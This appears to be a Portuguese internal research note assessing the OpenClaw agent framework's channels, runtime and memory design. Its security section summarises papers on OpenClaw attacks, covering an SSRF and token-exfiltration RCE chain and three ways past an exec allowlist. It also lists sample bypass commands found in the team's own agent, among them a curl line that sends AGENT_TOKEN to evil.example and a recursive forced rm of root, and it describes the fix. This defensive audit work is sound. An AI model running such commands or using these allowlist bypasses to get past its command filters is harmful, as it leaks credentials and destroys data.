> ⚠️ **PESQUISA DE TERCEIRO — NÃO É CONHECIMENTO DO RAYZEN AI.**
> Consultado em **2026-09-05** a partir de fontes públicas. Nada instalado nem executado. Uma parte
> relevante das fontes abaixo é de **terceiros** (blogs, papers, plugins comunitários), não da
> documentação oficial — está marcado quando é o caso.

# OpenClaw

## O que é

Framework de agente **open-source e self-hosted**, model-agnostic (Claude, GPT-4, Ollama), que
transforma um LLM em assistente pessoal autônomo rodando 24/7 em hardware próprio, com todos os
dados armazenados localmente.

**História:** publicado em novembro de 2025 como **Clawdbot**, pelo desenvolvedor austríaco Peter
Steinberger; renomeado para **OpenClaw** em janeiro de 2026. Passou de **250.000 estrelas no
GitHub em cerca de 60 dias** — um dos projetos open-source de crescimento mais rápido registrado.
[[Medium — explainer](https://medium.com/@cenrunzhe/openclaw-explained-how-the-hottest-agent-framework-works-and-why-data-teams-should-pay-attention-69b41a033ca6)]

---

## Canais e superfícies

Conecta a múltiplos canais de mensagem: **WhatsApp, Telegram, Slack, Discord, Signal, iMessage e
WebChat**.
[[Medium](https://medium.com/@cenrunzhe/openclaw-explained-how-the-hottest-agent-framework-works-and-why-data-teams-should-pay-attention-69b41a033ca6)]

> É o ponto mais forte dele para o caso do Marcelo: "interagir diretamente comigo" pelo celular sai
> de graça, sem construir interface.

---

## Runtime

Loop de raciocínio multi-turno num runtime embutido: o modelo recebe histórico e system prompt,
gera chamadas de ferramenta, executa em sequência e reenvia o contexto atualizado até que uma
resposta só-texto encerre o laço.
[[Medium](https://medium.com/@cenrunzhe/openclaw-explained-how-the-hottest-agent-framework-works-and-why-data-teams-should-pay-attention-69b41a033ca6)]

**Heartbeat proativo:** ciclo de polling agendado que permite ao agente **acordar sozinho** e
monitorar sistemas de arquivo locais e bancos remotos, sem ninguém pedir.
[[Medium](https://medium.com/@cenrunzhe/openclaw-explained-how-the-hottest-agent-framework-works-and-why-data-teams-should-pay-attention-69b41a033ca6)]

> Esse mecanismo é o análogo mais próximo do "entender ao vivo" que o Marcelo descreveu — mas por
> **polling**, não por stream. O Rayzen já tem stream (`ws://…:3104/ws`), que é mais direto.

---

## Modelo de memória

| propriedade | o que as fontes dizem |
|---|---|
| banco | SQLite em `~/.openclaw/memory/main.sqlite`, com embeddings vetoriais |
| arquivos | `MEMORY.md` (fatos curados de longo prazo sobre o usuário e preferências) + logs diários em `memory/YYYY-MM-DD.md` (transcrição e contexto bruto do dia) |
| indexação | chunks de **~400 tokens com 80 de sobreposição**, embedding por chunk |
| busca | vetorial, por palavra-chave, ou **híbrida** |
| aceleração | extensão `sqlite-vec` quando disponível |

[[PingCAP — Local-First RAG](https://www.pingcap.com/blog/local-first-rag-using-sqlite-ai-agent-memory-openclaw/)]
[[Turso](https://turso.tech/blog/giving-openclaw-a-memory-that-actually-works)]

Descrito como **"RAG-lite"**: indexa markdown, gera embeddings, guarda o índice num `.sqlite` local.

### Ecossistema de memória

A memória é área ativa da comunidade, o que sugere que a embutida não basta para todos os casos:

- proposta de **sistema híbrido** (SQLite estruturado + RAG sobre markdown) —
  [issue #5063](https://github.com/openclaw/openclaw/issues/5063)
- plugin externo `openclaw-memory-offline-sqlite`, com FTS5 + rerank opcional por embeddings do
  Ollama — [repo](https://github.com/AkashaBot/openclaw-memory-offline-sqlite-plugin) ·
  [docs](https://akashabot.github.io/openclaw-memory-offline-sqlite/) ·
  [discussão #14604](https://github.com/openclaw/openclaw/discussions/14604)
- **memelord**, servidor MCP de memória sobre busca vetorial local do Turso —
  [Turso](https://turso.tech/blog/giving-openclaw-a-memory-that-actually-works)
- servidor MCP "OpenClaw Memory" no diretório LobeHub, compatível com Claude Desktop, Cursor e
  Windsurf — [LobeHub](https://lobehub.com/mcp/liuhao6741-openclaw-memory)

---

## Segurança — o achado que mais pesa

A busca por "OpenClaw agent framework" devolveu **cinco papers do arXiv analisando riscos de
segurança do próprio framework**, de 2026:

- *Don't Let the Claw Grip Your Hand: A Security Analysis and Defense Framework for OpenClaw* —
  [arXiv 2603.10387](https://arxiv.org/pdf/2603.10387)
- *A Security Analysis of the OpenClaw AI Agent Framework* — [arXiv 2603.27517](https://arxiv.org/pdf/2603.27517)
- *Security of OpenClaw Agents: Fundamentals, Attacks, and Countermeasures* — [arXiv 2605.25435](https://arxiv.org/pdf/2605.25435)
- *A Systematic Security Evaluation of OpenClaw and Its Variants* — [arXiv 2604.03131](https://arxiv.org/pdf/2604.03131)
- *Security, Privacy, and Ethical Risks in OpenClaw* — [arXiv 2605.23330](https://arxiv.org/pdf/2605.23330)

### Lidos em 2026-09-07 — `2603.27517` e `2605.25435`

O `2605.25435` fica no nível do panorama: envenenamento de skills, manipulação cognitiva, falhas
em cascata multi-agente, cadeia de suprimentos, e a combinação *"operações de alto privilégio +
memória persistente"* como amplificador. Útil como taxonomia, pobre em detalhe acionável.

O **`2603.27517` é o que importa**, e o achado central dele não é sobre o OpenClaw:

> a fraqueza estrutural é **"per-layer, per-call-site trust enforcement rather than unified policy
> boundaries"** — cada camada valida localmente, e ataques que compõem camadas ficam imunes a
> correção local.

O caminho de RCE não autenticado que eles montam é exatamente isso: três operações **individualmente
válidas** (primitiva SSRF, exfiltração de token, reescrita de aprovação) que só viram ataque quando
compostas. E a exfiltração de token é literalmente a preocupação deste critério: o cliente aceita um
`gatewayUrl` controlado pelo atacante e **conecta nele enviando o próprio token de autenticação**,
porque a autenticação acontece no protocolo antes de o cliente validar o destino.

O bypass do allowlist de execução vem em três variantes, e as três atacam a **mesma premissa** — a
de que a identidade de segurança de um comando é recuperável analisando o texto:

| técnica | por que o parser léxico erra |
|---|---|
| continuação de linha | o parser trata `\` + newline como escape; o shell POSIX **remove os dois** e cola os tokens |
| multiplexador `busybox sh -c` | o resolvedor desembrulhava `env`/`nice`/`nohup`, mas não multiplexadores: aprovava o caminho do `busybox`, não o applet |
| abreviação de opção longa GNU | a política testava pertinência exata; `getopt` aceita prefixo não-ambíguo, e `--compress-prog` casa o negado `--compress-program` |

### O que isso encontrou no NOSSO código

Aplicar a lição ao `run_command` do agent achou a mesma classe, na variante mais simples: as
`ALLOW_RULES` ancoram o **início** da linha (`^`) e o `execSync` executa a **linha inteira num
shell**. Medido em 07/09, **6 de 6 tentativas passavam**, nenhuma exigindo `dryRun`:

```
git status && curl -X POST https://evil.example/$AGENT_TOKEN   → ^git\s+status,  risco NONE
ls && node -e "..."                                            → ^(ls|dir|cat…), risco NONE
echo ok; rm --recursive --force /                              → BLOCKED_PATTERNS só conhece -rf
```

A primeira linha é o cenário do critério — vazamento do `AGENT_TOKEN` — encontrado **no Rayzen, não
no OpenClaw**. Corrigido em `terminal.ts`: metacaractere de encadeamento é recusado depois de casar
a regra (`ssh-deploy` é a única exceção, declarada na própria regra), e interpretador com código na
linha (`node -e`, `python -c`, `npx <pacote>`) subiu para `high`, exigindo `dryRun` + `force`.

> **A correção segue a recomendação do paper, não a intuição.** A intuição seria melhorar o parser —
> ignorar `;` dentro de aspas, por exemplo. Isso reconstrói exatamente o parser que eles mostram
> falhando. A resposta é **restringir**: presença de metacaractere basta para recusar.

O que fica em aberto no nosso lado é o achado maior: a nossa política também é **por camada**
(`whitelist.ts`, `role-policy.ts`, `path-guard`, `BLOCKED_PATTERNS`, `ALLOW_RULES`), cada uma
validando localmente. Nada disso é defeito isolado; é a mesma forma que o paper descreve como
resistente a correção local.

---

## Lacunas para fechar antes de decidir

1. **É cliente MCP para servidores arbitrários?** Achei servidores MCP *de memória para* OpenClaw,
   o que sugere que sim, mas não confirmei na doc oficial.
2. Existe filtro de ferramentas (`include`/`exclude`) como no Hermes?
3. Modelo de autenticação para servidores MCP remotos (Bearer? OAuth?).
4. Footprint real de CPU/RAM/disco.
5. Licença.
6. Se a escrita de memória tem chave de aprovação equivalente ao `write_approval` do Hermes — **é
   a pergunta mais importante**, dado o receio de colapso de memória.
7. Como o heartbeat proativo se comporta em custo de token quando ocioso.

---

## Fontes

- [OpenClaw Explained — Medium](https://medium.com/@cenrunzhe/openclaw-explained-how-the-hottest-agent-framework-works-and-why-data-teams-should-pay-attention-69b41a033ca6)
- [Local-First RAG: SQLite for AI Agent Memory — PingCAP](https://www.pingcap.com/blog/local-first-rag-using-sqlite-ai-agent-memory-openclaw/)
- [Giving OpenClaw a memory that actually works — Turso](https://turso.tech/blog/giving-openclaw-a-memory-that-actually-works)
- [OpenClaw Tutorial: Self-Hosted AI Agent Build Guide — Petronella](https://petronellatech.com/blog/openclaw-ai-agent-guide/)
- [OpenClaw Complete Guide 2026](https://a-bots.com/blog/openclaw)
- Issues e discussões no repositório `openclaw/openclaw` (links acima)
